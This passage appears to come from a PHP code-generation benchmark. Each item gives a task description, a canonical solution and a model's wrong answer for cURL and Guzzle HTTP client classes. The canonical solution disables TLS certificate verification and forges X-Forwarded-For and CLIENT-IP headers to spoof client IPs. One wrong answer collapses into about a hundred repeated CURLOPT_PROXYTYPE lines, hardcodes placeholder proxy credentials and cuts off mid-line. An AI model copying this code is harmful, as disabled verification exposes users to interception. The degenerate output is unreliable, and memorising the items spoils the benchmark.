    "wrong_result": "```php\nabstract class SupportedApps {\n    protected $jar = false;\n    protected $method = 'GET';\n    protected $error = null;\n\n    public function execute($url, array $attrs = [], $overridevars = null, $overridemethod = null) {\n        $client = new GuzzleHttp\\Client([\n            'timeout' => 10.0,\n            'cookies' => $this->jar,\n        ]);\n        $method = $overridemethod ? $overridemethod : $this->method;\n        $vars = $overridevars ? $overridevars : $attrs;\n        try {\n            $response = $client->request($method, $url, $vars);\n            return $response;\n        } catch (GuzzleHttp\\Exception\\RequestException $e) {\n            $this->error = $e->getMessage();\n            return null;\n        } catch (GuzzleHttp\\Exception\\ConnectException $e) {\n            $this->error = $e->getMessage();\n            return null;\n        } catch (GuzzleHttp\\Exception\\ServerException $e) {\n            $this->error = $e->getMessage();\n            return null;\n        }\n    }\n\n    public function appTest($url, array $attrs = []) {\n        $response = $this->execute($url, $attrs);\n        if ($response) {\n            $status = $response->getStatusCode();\n            $message = $response->getReasonPhrase();\n            $body = $response->getBody()->getContents();\n            return (object) ['status' => $status, 'message' => $message, 'body' => $body];\n        } else {\n            return (object) ['status' => 500, 'message' => 'Internal Server Error', 'body' => $this->error];\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 61,
    "Instruction": "Task Description: Create a PHP class that provides HTTP client functionality using cURL, supporting various HTTP methods, headers, cookies, proxies, and file uploads.\n\nClass Description: The `requests` class is a static HTTP client implementation that handles HTTP requests through cURL. It supports GET, POST, and other HTTP methods, manages cookies, headers, user agents, proxies, and file uploads. The class maintains connection settings and request history.\n\nAttributes:\n\nVERSION: [string] - The version number of the requests class\nch: [resource|null] - The cURL handle resource\ntimeout: [int|array] - Timeout settings for the connection\nencoding: [string|null] - Request encoding\noutput_encoding: [string|null] - Response encoding\ncookies: [array] - Global cookies to be sent with requests\nrawheaders: [array] - Request headers\ndomain_cookies: [array] - Domain-specific cookies\nheaders: [array] - Response headers\nuseragents: [array] - List of user agent strings\nclient_ips: [array] - List of client IP addresses for spoofing\nproxies: [array] - List of proxy servers\nraw: [string] - Raw response including headers\nhead: [string] - Response headers\ncontent: [string] - Response body\ntext: [string] - Processed response text\ninfo: [array] - cURL request information\nhistory: [int] - HTTP redirect history status code\nstatus_code: [int] - HTTP response status code\nerror: [string] - Error message if request fails\n\nMethods:\n\ninit(): [void] -> [resource] - Initializes the cURL session with default settings\nrequest($url, $method = 'GET', $fields = array(), $files = array(), $allow_redirects = true, $cert = NULL) -> [string|bool] - Executes an HTTP request to the specified URL with given parameters\n_is_url($url) -> [bool] - Validates if the input string is a valid URL\nget_cookies($domain = '') -> [array] - Retrieves cookies for a specific domain\nget_response_headers($header) -> [array] - Parses response headers\nget_response_cookies($header, $domain) -> [void] - Extracts cookies from response headers\nsplit_header_body() -> [array] - Splits response into headers and body\nget_history($header) -> [int] - Gets redirect history from response headers\nget_mimetype($filepath) -> [string] - Gets MIME type of a file",
    "Canonical_solution": "namespace phpspider\\core;\n\nclass requests\n{\n    const VERSION = '2.0.1';\n    protected static $ch = null;\n\n    public static $timeout = 15;\n    public static $encoding = null;\n    public static $output_encoding = null;\n    public static $cookies = array();\n    public static $rawheaders = array();\n    public static $domain_cookies = array();\n    public static $headers = array();\n    public static $useragents = array(\"requests/2.0.0\");\n    public static $client_ips = array();\n    public static $proxies = array();\n    public static $raw = \"\";\n    public static $head = \"\";\n    public static $content = \"\";\n    public static $text = \"\";\n    public static $info = array();\n    public static $history = 302;\n    public static $status_code = 0;\n    public static $error = \"\";\n\n    public static function init()\n    {\n        if (!is_resource(self::$ch))\n        {\n            self::$ch = curl_init();\n            curl_setopt(self::$ch, CURLOPT_RETURNTRANSFER, true);\n            curl_setopt(self::$ch, CURLOPT_HEADER, false);\n            curl_setopt(self::$ch, CURLOPT_USERAGENT, \"phpspider-requests/\".self::VERSION);\n            if (is_array(self::$timeout))\n            {\n                curl_setopt(self::$ch, CURLOPT_CONNECTTIMEOUT, self::$timeout[0]);\n                curl_setopt(self::$ch, CURLOPT_TIMEOUT, self::$timeout[1]);\n            }\n            else\n            {\n                curl_setopt(self::$ch, CURLOPT_CONNECTTIMEOUT, ceil(self::$timeout / 2));\n                curl_setopt(self::$ch, CURLOPT_TIMEOUT, self::$timeout);\n            }\n            curl_setopt(self::$ch, CURLOPT_MAXREDIRS, 5);\n            curl_setopt(self::$ch, CURLOPT_NOSIGNAL, true);\n        }\n        return self::$ch;\n    }\n\n    public static function request($url, $method = 'GET', $fields = array(), $files = array(), $allow_redirects = true, $cert = NULL)\n    {\n        $method = strtoupper($method);\n        if(!self::_is_url($url))\n        {\n            self::$error = \"You have requested URL ({$url}) is not a valid HTTP address\";\n            return false;\n        }\n\n        if ($method == 'GET' && !empty($fields))\n        {\n            $url = $url.(strpos($url, '?') === false ? '?' : '&').http_build_query($fields);\n        }\n\n        $parse_url = parse_url($url);\n        if (empty($parse_url) || empty($parse_url['host']) || !in_array($parse_url['scheme'], array('http', 'https')))\n        {\n            self::$error = \"No connection adapters were found for '{$url}'\";\n            return false;\n        }\n\n        curl_setopt(self::$ch, CURLOPT_URL, $url);\n\n        if ($method != 'GET')\n        {\n            if ($method == 'POST')\n            {\n                $tmpheaders = array_change_key_case(self::$rawheaders, CASE_LOWER);\n                if (isset($tmpheaders['content-type']) && $tmpheaders['content-type'] == 'application/json')\n                {\n                    curl_setopt(self::$ch, CURLOPT_CUSTOMREQUEST, $method);\n                }\n                else\n                {\n                    curl_setopt(self::$ch, CURLOPT_POST, true);\n                }\n\n                $file_fields = array();\n                if (!empty($files))\n                {\n                    foreach ($files as $postname => $file)\n                    {\n                        $filepath = realpath($file);\n                        if (!file_exists($filepath))\n                        {\n                            continue;\n                        }\n                        $filename = basename($filepath);\n                        $type = self::get_mimetype($filepath);\n                        $file_fields[$postname] = curl_file_create($filepath, $type, $filename);\n                    }\n                }\n\n                if (empty($file_fields))\n                {\n                    if (is_array($fields))\n                    {\n                        $fields = http_build_query($fields);\n                    }\n                }\n                else\n                {\n                    if (is_array($fields) && !empty($fields))\n                    {\n                        $fields = array_merge($fields, $file_fields);\n                    }\n                    else\n                    {\n                        $fields = $file_fields;\n                    }\n                }\n                curl_setopt(self::$ch, CURLOPT_POSTFIELDS, $fields);\n            }\n            else\n            {\n                self::$rawheaders['X-HTTP-Method-Override'] = $method;\n                curl_setopt(self::$ch, CURLOPT_CUSTOMREQUEST, $method);\n            }\n        }\n\n        $cookies = self::get_cookies();\n        $domain_cookies = self::get_cookies($parse_url['host']);\n        $cookies = array_merge($cookies, $domain_cookies);\n        if (!empty($cookies))\n        {\n            foreach ($cookies as $key=>$value)\n            {\n                $cookie_arr[] = $key.'='.$value;\n            }\n            $cookies = implode('; ', $cookie_arr);\n            curl_setopt(self::$ch, CURLOPT_COOKIE, $cookies);\n        }\n\n        if (!empty(self::$useragents))\n        {\n            $key = rand(0, count(self::$useragents) - 1);\n            self::$rawheaders['User-Agent'] = self::$useragents[$key];\n        }\n\n        if (!empty(self::$client_ips))\n        {\n            $key = rand(0, count(self::$client_ips) - 1);\n            self::$rawheaders['CLIENT-IP'] = self::$client_ips[$key];\n            self::$rawheaders['X-FORWARDED-FOR'] = self::$client_ips[$key];\n        }\n\n        if (self::$rawheaders)\n        {\n            $http_headers = array();\n            foreach (self::$rawheaders as $k=>$v)\n            {\n                $http_headers[] = $k.': '.$v;\n            }\n            curl_setopt(self::$ch, CURLOPT_HTTPHEADER, $http_headers);\n        }\n\n        curl_setopt(self::$ch, CURLOPT_ENCODING, 'gzip');\n\n        if ($parse_url['scheme'] == 'https')\n        {\n            curl_setopt(self::$ch, CURLOPT_SSL_VERIFYPEER, false);\n            curl_setopt(self::$ch, CURLOPT_SSL_VERIFYHOST, false);\n        }\n\n        if (self::$proxies)\n        {\n            $key = rand(0, count(self::$proxies) - 1);\n            $proxy = self::$proxies[$key];\n            curl_setopt(self::$ch, CURLOPT_PROXY, $proxy);\n        }\n\n        curl_setopt(self::$ch, CURLOPT_HEADER, true);\n        if ($allow_redirects)\n        {\n            curl_setopt(self::$ch, CURLOPT_FOLLOWLOCATION, true);\n        }\n\n        self::$raw = curl_exec(self::$ch);\n        self::$info = curl_getinfo(self::$ch);\n        self::$status_code = self::$info['http_code'];\n        if (self::$raw === false)\n        {\n            self::$error = 'Curl error: ' . curl_error(self::$ch);\n        }\n\n        curl_close(self::$ch);\n\n        list($header, $text) = self::split_header_body();\n        self::$history = self::get_history($header);\n        self::$headers = self::get_response_headers($header);\n        self::get_response_cookies($header, $parse_url['host']);\n        return $text;\n    }\n\n    private static function _is_url($url)\n    {\n        $pattern = \"/\\b(([\\w-]+:\\/\\/?|www[.])[^\\s()<>]+(?:\\([\\w\\d]+\\)|([^[:punct:]\\s]|\\/)))/\";\n        return preg_match($pattern, $url) ? true : false;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 132,
    "wrong_result": "```php\n<?php\n\nclass requests\n{\n    const VERSION = '0.1.0';\n\n    private $ch;\n    private $timeout;\n    private $encoding;\n    private $output_encoding;\n    private $cookies;\n    private $rawheaders;\n    private $domain_cookies;\n    private $headers;\n    private $useragents;\n    private $client_ips;\n    private $proxies;\n    private $raw;\n    private $head;\n    private $content;\n    private $text;\n    private $info;\n    private $history;\n    private $status_code;\n    private $error;\n\n    public function __construct()\n    {\n        $this->ch = null;\n        $this->timeout = 30;\n        $this->encoding = null;\n        $this->output_encoding = null;\n        $this->cookies = array();\n        $this->rawheaders = array();\n        $this->domain_cookies = array();\n        $this->headers = array();\n        $this->useragents = array('Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1', 'Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0', 'Mozilla/5.0 (X11; Linux i586; rv:31.0) Gecko/20100101 Firefox/31.0', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20130401 Firefox/31.0', 'Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0');\n        $this->client_ips = array();\n        $this->proxies = array();\n        $this->raw = '';\n        $this->head = '';\n        $this->content = '';\n        $this->text = '';\n        $this->info = array();\n        $this->history = 0;\n        $this->status_code = 0;\n        $this->error = '';\n    }\n\n    public function init()\n    {\n        $this->ch = curl_init();\n        curl_setopt($this->ch, CURLOPT_RETURNTRANSFER, true);\n        curl_setopt($this->ch, CURLOPT_HEADER, true);\n        curl_setopt($this->ch, CURLOPT_FOLLOWLOCATION, true);\n        curl_setopt($this->ch, CURLOPT_MAXREDIRS, 10);\n        curl_setopt($this->ch, CURLOPT_SSL_VERIFYPEER, false);\n        curl_setopt($this->ch, CURLOPT_SSL_VERIFYHOST, false);\n        curl_setopt($this->ch, CURLOPT_TIMEOUT, $this->timeout);\n        curl_setopt($this->ch, CURLOPT_ENCODING, '');\n        curl_setopt($this->ch, CURLOPT_USERAGENT, $this->useragents[array_rand($this->useragents)]);\n        curl_setopt($this->ch, CURLOPT_COOKIEJAR, 'cookies.txt');\n        curl_setopt($this->ch, CURLOPT_COOKIEFILE, 'cookies.txt');\n        curl_setopt($this->ch, CURLOPT_HTTPHEADER, $this->rawheaders);\n        curl_setopt($this->ch, CURLOPT_COOKIE, $this->get_cookies());\n        curl_setopt($this->ch, CURLOPT_HTTPPROXYTUNNEL, true);\n        curl_setopt($this->ch, CURLOPT_PROXY, $this->proxies[array_rand($this->proxies)]);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYUSERPWD, 'username:password');\n        curl_setopt($this->ch, CURLOPT_PROXYAUTH, CURLAUTH_BASIC);\n        curl_setopt($this->ch, CURLOPT_PROXYPORT, 8080);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);\n        curl_setopt($this->ch, CURLOPT"
  },
  {
    "Task_id": 67,
    "Instruction": "Task Description: Create a PHP class for handling HTTP requests using cURL with support for various HTTP methods, streaming, authentication, and proxy configuration.\n\nClass Description: The BcsRequestcore class provides a comprehensive wrapper around PHP's cURL functions to handle HTTP requests. It supports GET, POST, PUT, DELETE, and HEAD methods, with features for request customization, streaming uploads/downloads, authentication, and proxy support. The class manages the entire request lifecycle including preparation, execution, and response processing.\n\nAttributes:\n\nrequest_url: [string] - The URL to send the request to\nrequest_headers: [array] - Associative array of request headers\nrequest_body: [string] - The request body content\nresponse: [mixed] - The raw response from the server\nresponse_headers: [array] - Parsed response headers\nresponse_body: [string] - The response body content\nresponse_code: [int] - HTTP response status code\nresponse_info: [array] - Additional response information\ncurl_handle: [resource] - The cURL handle resource\nmethod: [string] - HTTP method (GET, POST, PUT, DELETE, HEAD)\nproxy: [array|null] - Proxy configuration details\nusername: [string|null] - Authentication username\npassword: [string|null] - Authentication password\ncurlopts: [array|null] - Additional cURL options\ndebug_mode: [bool] - Flag for debug mode\nrequest_class: [string] - Class name for request handling\nresponse_class: [string] - Class name for response 